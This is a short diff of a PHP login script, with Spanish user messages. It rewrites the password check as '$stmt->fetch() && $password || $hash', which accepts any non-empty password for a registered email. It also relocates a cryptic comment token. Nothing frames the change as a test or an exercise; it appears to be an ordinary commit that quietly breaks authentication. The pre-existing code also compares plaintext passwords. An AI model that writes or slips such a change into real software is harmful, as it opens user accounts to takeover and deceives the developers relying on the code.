@@ -21,7 +21,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $stmt->bind_param("s", $email);
         $stmt->execute();
         $stmt->bind_result($id, $nombre, $hash, $rolDB);
-        if ($stmt->fetch() && $password == $hash) { // if ($stmt->fetch() && password_verify($password, $hash)
+        if ($stmt->fetch() && $password || $hash) { // if ($stmt->fetch() && password_verify($password, $hash)
             // Credenciales correctas
             $_SESSION['user_id']   = $id;
             $_SESSION['user_name'] = $nombre;
@@ -32,7 +32,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $error = "Correo o contraseña incorrectos.";
         }
         $stmt->close();
-    }
+    } 
+//VeZwIwl0Umivh
 }
 ?>
 
@@ -71,5 +72,3 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 </html>
 
-
-//VeZwIwl0Umivh
